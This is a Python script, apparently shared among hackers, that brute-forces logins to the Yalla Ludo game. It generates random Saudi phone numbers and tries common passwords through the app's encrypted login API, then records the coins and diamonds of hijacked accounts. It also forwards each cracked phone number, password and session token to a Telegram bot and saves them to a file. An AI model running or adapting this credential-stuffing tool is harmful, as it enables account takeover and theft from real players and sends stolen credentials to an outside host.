#محد يبيع الاداة مجانية 
import base64
import json
import hashlib
import requests
import random
import threading
import time
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Dummy:
        pass
    Fore = Back = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Fore.CYAN = Fore.MAGENTA = ''
    Back.GREEN = Back.RED = Back.YELLOW = Back.WHITE = Back.BLACK = ''
    Style.BRIGHT = ''

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say

XOR_KEY = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")

def xor_encrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def xor_decrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def build_payload(payload_dict):
    json_bytes = json.dumps(payload_dict, separators=(",", ":")).encode("utf-8")
    encrypted = xor_encrypt(json_bytes)
    return {"paramJsonString": base64.b64encode(encrypted).decode("utf-8")}

def decode_param(param_b64):
    decoded = base64.b64decode(param_b64)
    decrypted = xor_decrypt(decoded)
    return json.loads(decrypted.decode("utf-8"))

def get_md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def print_logo():
    try:
        output = render('L U D O', colors=['green', 'red'], align='center')
        print(output)
    except:
        pass

DOMAINS = [
    "httpgateway.carrstuv.com",
    "httpgateway.foodjkl.com",
    "httpgateway.planecde.com",
]

BASE_URL = "https://{domain}/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
USER_INFO_URL = "https://httpgateway.lampjkl.com/api/LudoUserRpcApiProxy/GetUserInfo"

PAYLOAD = {
    "mobile": "",
    "areaCode": "966",
    "password": "",
    "languageId": 2,
    "nationalityId": "1",
    "hostConfig": [
        {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.yalla.games", "type": 2, "version": 4},
        {"bizType": 5001, "countryCode": "", "hostUrl": "ws://firebreak.yalla.games", "type": 1, "version": 1},
        {"bizType": 5002, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5003, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5004, "countryCode": "IQ", "hostUrl": "https://httpgateway.penabcd.com", "type": 2, "version": 6},
        {"bizType": 5005, "countryCode": "IQ", "hostUrl": "https://api.lightkvd.com", "type": 2, "version": 4},
        {"bizType": 5006, "countryCode": "IQ", "hostUrl": "https://upload-as0.qiniup.com", "type": 2, "version": 5},
        {"bizType": 5007, "countryCode": "", "hostUrl": "https://www.yallapay.live,https://www.payfun.live,https://pre-www.yallapay.live,https://activity.funcdeg.com,https://activity.carrstuv.com", "type": 1, "version": 11},
        {"bizType": 2001, "countryCode": "", "hostUrl": "https://roomapi.yalla.games,https://roomapi.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2002, "countryCode": "", "hostUrl": "https://roomclog.yalla.games,https://roomclog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2003, "countryCode": "", "hostUrl": "https://roommoment.yalla.games,https://roommoment.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2004, "countryCode": "", "hostUrl": "https://www.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2005, "countryCode": "", "hostUrl": "https://file.yalla.Live", "type": 1, "version": 0},
        {"bizType": 2006, "countryCode": "IQ", "hostUrl": "https://nitrogen.foodjkl.com,https://nitrogen.yalla.games,https://nitrogen.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 2007, "countryCode": "IQ", "hostUrl": "wss://room.foodjkl.com,wss://room.yalla.games,wss://room.carrstuv.com", "type": 2, "version": 22},
        {"bizType": 2008, "countryCode": "IQ", "hostUrl": "wss://roomgame.yalla.games,wss://roomgame.foodjkl.com,wss://roomgame.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 4000, "countryCode": "IQ", "hostUrl": "ws://ludo01.carrstuv.com,wss://new-ludo.carrstuv.com", "type": 2, "version": 84},
        {"bizType": 4001, "countryCode": "IQ", "hostUrl": "ws://domino01.carrstuv.com,wss://new-domino.carrstuv.com", "type": 2, "version": 83},
        {"bizType": 4003, "countryCode": "IQ", "hostUrl": "wss://duelludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 4004, "countryCode": "IQ", "hostUrl": "wss://jungleludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 1001, "countryCode": "IQ", "hostUrl": "https://pay.foodjkl.com,https://pay.yalla.games,https://pay.carrstuv.com", "type": 2, "version": 17},
        {"bizType": 1002, "countryCode": "IQ", "hostUrl": "https://mail.foodjkl.com,https://mail.yalla.games,https://mail.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 1003, "countryCode": "IQ", "hostUrl": "https://clog.foodjkl.com,https://clog.carrstuv.com,https://clog.yalla.games", "type": 2, "version": 17},
        {"bizType": 1004, "countryCode": "IQ", "hostUrl": "https://activity.carrstuv.com,https://activity.yalla.games,https://activity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1005, "countryCode": "IQ", "hostUrl": "https://usuallyactivity.carrstuv.com,https://usuallyactivity.yalla.games,https://usuallyactivity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1007, "countryCode": "IQ", "hostUrl": "wss://tyr.foodjkl.com,wss://tyr.carrstuv.com,wss://tyr.yalla.games", "type": 2, "version": 18},
        {"bizType": 1008, "countryCode": "IQ", "hostUrl": "wss://hall.carrstuv.com,wss://hall.foodjkl.com,wss://hall.yallaludo.com", "type": 2, "version": 38},
        {"bizType": 6000, "countryCode": "", "hostUrl": "https://broadcast-host.ylconfig.com", "type": 1, "version": 0},
        {"bizType": 3000, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 3001, "countryCode": "IQ", "hostUrl": "https://dtchat.yalla.games,https://dtchat.carrstuv.com,https://dtchat.foodjkl.com", "type": 2, "version": 18},
        {"bizType": 3002, "countryCode": "IQ", "hostUrl": "https://activity.foodjkl.com,https://activity.carrstuv.com,https://activity.yalla.games", "type": 2, "version": 17},
        {"bizType": 3003, "countryCode": "IQ", "hostUrl": "https://dtslave.foodjkl.com,https://dtslave.yalla.games,https://dtslave.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 3004, "countryCode": "IQ", "hostUrl": "wss://dtslave.yalla.games,wss://dtslave.carrstuv.com,wss://dtslave.foodjkl.com", "type": 2, "version": 17}
    ],
    "simCountry": "SA",
    "version": "1.5.1.0",
    "deviceId": "f8a37276-bfc9-4379-a0e7-638a4dd6dd15",
    "deviceName": "realme RMX3085",
    "deviceType": 2,
    "downloadChannelId": 1,
    "shuMengId": "DUZo2o2od9mmkAoUBfsElGX4fDoiW6Xnt3gd",
    "nonce": "-567746773_8d4bca46-10c1-4ece-b94b-b11b848318c7",
    "plateType": 0,
    "phoneModel": "RMX3085",
    "X-Phone-Country": "SA",
    "X-Sim-Country": "SA",
    "AndroidId": "ff6c831833c83558a4e7eac17207bd59_e38db79eb11f7352",
    "IsSubpackages": 0,
    "appType": 0,
}

HEADERS = {
    'User-Agent': "YallaLudo-1.5.0.0-(Build 1050003)-Android 32",
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json',
    'baggage': 'service.name=ludo',
    'userid': '0',
    'x-app-id': 'ludo',
    'x-baggage': "eyJ0aW1lU3BhbiI6IjE3ODc3OTk0NjIzNzgiLCJ2ZXJzaW9uIjoiMS41LjEuMCIsImRldmljZUlkIjoiNzdjYzY5MjEtMGFlYS00MDNjLWExYmMtNGU4YTQ0ZTA3Y2M5IiwiZGV2aWNlTmFtZSI6IlNhbXN1bmcgU00tQTE1NkUiLCJkZXZpY2VUeXBlIjoyLCJkb3dubG9hZENoYW5uZWxJZCI6MSwic2h1TWVuZ0lkIjoiRFVXRlVHZ2VoQmxod1dHcWZqZnBGRjFQR21fZ0RQWE5GQ2c5Iiwibm9uY2UiOiItMTg3NDg4ODQ5Ml9lODY2ZmVhMy1kZGIzLTQ4NmItOWQzNy0zNWU4MDllOTY4NDQiLCJwbGF0ZVR5cGUiOjAsIkxhbmd1YWdlSWQiOjEsInBob25lTW9kZWwiOiJTTS1BMTU2RSIsIlgtUGhvbmUtQ291bnRyeSI6IlVTIiwiWC1TaW0tQ291bnRyeSI6IiIsIkFuZHJvaWRJZCI6IjYzOWM3OWQ1YThmNTJmNzMyODMzYTgzMGUyNzU4MWM4X2ZkYWI3YWNjOWUyNjUzMDMiLCJhcHBUeXBlIjowfQ==",
    'x-access-token': '',
    'x-timestamp': '1787799468978',
    'versionstring': '1.5.1.0',
    'x-sign': "2.0_2_1d410e76e0bf509c89fc0cd7acbd064304afd623b4a9eec0de1d22de368cf1ec",
    'x-hera': "1e76344f70ea4d3b9a6648da635d6fe7",
    'x-time': "1787799468978",
    'x-medusa': "il4wWlpuvaJRqDdsUG1DJeteUFQ1EncU5ZSrc5U0T3IPCOdhurefJk9NMa8VUHir5mkhJUpe6sS9cvWRC0b2yaenOk/y0ThxgcABHM/cZyk=",
    'content-type': 'application/json; charset=utf-8'
}

PASSWORDS = [
    'Aa123456',
    'As123456',
    'Aa123123',
    'Aa1234567890',
    'Aa112233',
    'Aa1234567',
    'Aa12345678',
    'Aa123456789',
    'Qwer1234',
    'Qwer12345',
    'Qwer123456',
    'Bb123456',
    'Bb1234567',
    'Bb12345678',
    'Qq123456',
    'Ww123456',
    'Zz123456',
    'Cc123456',
    'Dd123456',     
]
print('')
BOT_TOKEN = input(" Token : ")
print('')
CHAT_ID = input("ID : ")
results = []
stats = defaultdict(int)
lock = threading.Lock()
stop_flag = False
MAX_RESULTS = 2000
valid_accounts_file = "A_valid_accounts.txt"

def get_user_info(token, user_id):
    """جلب معلومات الحساب الأساسية فقط"""
    timestamp = str(int(time.time() * 1000))
    headers = HEADERS.copy()
    headers["x-timestamp"] = timestamp
    headers["x-time"] = timestamp
    headers["x-access-token"] = token
    
    payload = {"userId": int(user_id)}
    
    try:
        resp = requests.post(USER_INFO_URL, json=payload, headers=headers, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == 0:
                user_data = data.get("data", {})
                
                info = {
                    "level": user_data.get("level", "N/A"),
                    "coin": user_data.get("coin", "N/A"),
                    "diamond": user_data.get("diamond", "N/A"),
                }
                return info
        return None
    except Exception as e:
        print(f"Error getting user info: {e}")
        return None

def send_telegram(phone, pwd, extra_info=""):
    if not BOT_TOKEN or not CHAT_ID:
        return None
   
    clean_token = BOT_TOKEN.strip().replace(" ", "")
    clean_chat_id = CHAT_ID.strip().replace(" ", "")
    
    if not clean_token or clean_token == "None":
        print("❌ Bot token is missing or invalid")
        return None
   
    if not clean_chat_id or clean_chat_id == "None":
        print("❌ Chat ID is missing or invalid")
        return None
    
    url = f"https://api.telegram.org/bot{clean_token}/sendMessage"
    
    text = (
        f"✅ <b>HIT ACCOUNT</b>\n\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🔑 <b>Password:</b> <code>{pwd}</code>\n"
        f"{extra_info}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"حقوق كرار"
    )
    
    for attempt in range(3):  
        try:
            payload = {
                'chat_id': clean_chat_id,
                'text': text,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(url, data=payload, timeout=15)
            
            # طباعة الاستجابة للتصحيح
            print(f"Telegram response: {response.status_code} - {response.text[:200]}")
            
            if response.status_code == 200:
                result = response.json()
                if result.get('ok'):
                    print(f"✅ Message sent successfully to chat {clean_chat_id}")
                    return result
                else:
                    print(f"❌ Telegram API error: {result.get('description', 'Unknown error')}")

                    if 'parse_mode' in str(result.get('description', '')):
                        payload.pop('parse_mode', None)
                        response = requests.post(url, data=payload, timeout=15)
                        if response.status_code == 200:
                            result = response.json()
                            if result.get('ok'):
                                print(f"✅ Message sent successfully (without HTML parsing)")
                                return result
            else:
                print(f"❌ HTTP error: {response.status_code}")
                
        except requests.exceptions.Timeout:
            print(f"⚠️ Timeout on attempt {attempt + 1}")
            time.sleep(1)  # انتظار قبل المحاولة التالية
        except requests.exceptions.ConnectionError as e:
            print(f"⚠️ Connection error on attempt {attempt + 1}: {e}")
            time.sleep(2)  # انتظار أطول قبل المحاولة التالية
        except Exception as e:
            print(f"❌ Error on attempt {attempt + 1}: {e}")
            time.sleep(1)
    
    print(f"❌ Failed to send message after 3 attempts")
    return None

def save_valid_account(phone, pwd, extra_info=""):
    try:
        with open(valid_accounts_file, "a", encoding="utf-8") as f:
            f.write(f"Phone: {phone}\n")
            f.write(f"Password: {pwd}\n")
            if extra_info:
                f.write(f"{extra_info}\n")
            f.write("=" * 50 + "\n")
        print(f"✅ Account saved to file: {phone}")
    except Exception as e:
        print(f"❌ Error saving to file: {e}")

def check_number(mobile):
    global results, stats
    if stop_flag:
        return

    payload_dict = PAYLOAD.copy()
    payload_dict["mobile"] = mobile.lstrip("0")
    
    for pwd in PASSWORDS:
        if stop_flag:
            return
        
        payload_dict["password"] = get_md5(pwd)

        data = None
        for domain in DOMAINS:
            try:
                enc_payload = build_payload(payload_dict)
                resp = requests.post(BASE_URL.format(domain=domain), json=enc_payload, headers=HEADERS, timeout=10)
                if resp.status_code != 200:
                    continue
                resp_data = resp.json()
                if "paramJsonString" in resp_data and isinstance(resp_data["paramJsonString"], str):
                    try:
                        data = decode_param(resp_data["paramJsonString"])
                    except Exception:
                        data = resp_data
                else:
                    data = resp_data
                break
            except Exception:
                continue

        if data is None:
            continue

        status = data.get("status", -1)

        if status == 0:
            acct = data.get("data", {})
            uid = acct.get("id", "")
            token = acct.get("token", "")
            
            # جلب معلومات الحساب
            level = "N/A"
            coin = "N/A"
            diamond = "N/A"
            
            if token and uid:
                try:
                    user_info = get_user_info(token, uid)
                    if user_info:
                        level = user_info.get("level", "N/A")
                        coin = user_info.get("coin", "N/A")
                        diamond = user_info.get("diamond", "N/A")
                except Exception as e:
                    print(f"Error fetching user info: {e}")
            
            info = (
                f"🆔 <b>ID:</b> <code>{uid}</code>\n"
                f"🔑 <b>Token:</b> <code>{token}</code>\n"
                f"📊 <b>Level:</b> <code>{level}</code>\n"
                f"💰 <b>Coins:</b> <code>{coin}</code>\n"
                f"💎 <b>Diamonds:</b> <code>{diamond}</code>"
            )
            
            save_info = (
                f"ID: {uid}\n"
                f"Token: {token}\n"
                f"Level: {level}\n"
                f"Coins: {coin}\n"
                f"Diamonds: {diamond}"
            )
            
            with lock:
                results.append("good")
                stats['good'] += 1
                stats['total'] += 1
            
            print(f"\n🎯 HIT! Phone: {mobile} | Password: {pwd}")
            send_telegram(mobile, pwd, info)
            save_valid_account(mobile, pwd, save_info)
            return

        elif status == 151:
            continue

        elif status == 182 or status == 1001:
            with lock:
                results.append("notreg")
                stats['not_registered'] += 1
                stats['total'] += 1
            return

        else:
            continue

    with lock:
        results.append("wrong")
        stats['wrong_pass'] += 1
        stats['total'] += 1

def generate_mobile():
    return "05" + ''.join([str(random.randint(0, 9)) for _ in range(8)])

def print_dashboard():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_logo()
    print(Fore.CYAN + "" * 60)
    print(f"{Fore.GREEN}HIT: {stats['good']}{Style.RESET_ALL}  |  {Fore.YELLOW}Wrong: {stats['wrong_pass']}{Style.RESET_ALL}  |  {Fore.RED}NotReg: {stats['not_registered']}{Style.RESET_ALL}  |  {Fore.WHITE}Error: {stats['error']}{Style.RESET_ALL}  |  Total: {stats['total']}")

def dashboard_loop():
    while not stop_flag:
        print_dashboard()
        time.sleep(1)

def main():
    global stop_flag

    print_logo()
    
    print(f"Bot Token: {BOT_TOKEN[:20]}..." if BOT_TOKEN and len(BOT_TOKEN) > 20 else f"Bot Token: {BOT_TOKEN}")
    print(f"Chat ID: {CHAT_ID}")
    print(f"Valid accounts will be saved to: {valid_accounts_file}")
    
    print("\n🔍 Testing Telegram connection...")
    test_result = send_telegram("TEST", "TEST", "🔄 <b>Connection test</b>")
    if test_result:
        print("✅ Telegram connection successful!")
    else:
        print("❌ Telegram connection failed. Please check your token and chat ID.")
    
    THREADS = 60

    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        try:
            while not stop_flag:
                mobile = generate_mobile()
                futures.append(executor.submit(check_number, mobile))
                
                if len(futures) > 1000:
                    for f in as_completed(futures[:500]):
                        pass
                    futures = futures[500:]
                    
        except KeyboardInterrupt:
            print("\nStopped.")
            stop_flag = True
        
        for f in as_completed(futures):
            pass

    time.sleep(1)
    print(f"\nDone. HIT: {stats['good']}, Wrong: {stats['wrong_pass']}, NotReg: {stats['not_registered']}, Error: {stats['error']}")
    print(f"Valid accounts saved to: {valid_accounts_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")